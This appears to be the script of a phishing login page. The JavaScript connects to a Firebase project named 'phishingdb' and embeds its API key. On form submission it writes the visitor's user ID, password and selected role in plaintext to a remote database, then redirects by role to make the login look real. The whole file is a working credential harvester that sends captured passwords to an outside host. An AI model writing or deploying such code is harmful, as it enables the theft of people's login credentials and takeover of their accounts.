// Firebase SDK imports
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyA8cPDzcSvjvLdVdeoVFqmJjrksLJIZ12Y",
  authDomain: "phishingdb-942b2.firebaseapp.com",
  databaseURL: "https://phishingdb-942b2-default-rtdb.firebaseio.com", // Make sure this is added
  projectId: "phishingdb-942b2",
  storageBucket: "phishingdb-942b2.appspot.com",
  messagingSenderId: "752083508136",
  appId: "1:752083508136:web:533f0289f9384d21275b9d"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Wait for DOM to load
document.addEventListener("DOMContentLoaded", () => {
  const loginForm = document.getElementById("loginForm");

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const userId = document.getElementById("userId").value.trim();
    const password = document.getElementById("password").value.trim();
    const role = document.getElementById("profile").value;

    if (!userId || !password) {
      alert("Please fill in all fields.");
      return;
    }

    try {
      const safeUserId = userId.replace(/\./g, "_");  // Replace dots
      await set(ref(db, 'logindb/' + safeUserId), {        email: userId,
        password: password,
        role: role
      });

      // Redirect based on role
      if (role === "admin") {
        window.location.href = "/admin";
      } else if (role === "super_admin") {
        window.location.href = "/superadmin";
      } else {
        window.location.href = "/home";
      }
    } catch (error) {
      console.error("Error storing to Firebase:", error);
      alert("Failed to login. Check console.");
    }
  });
});
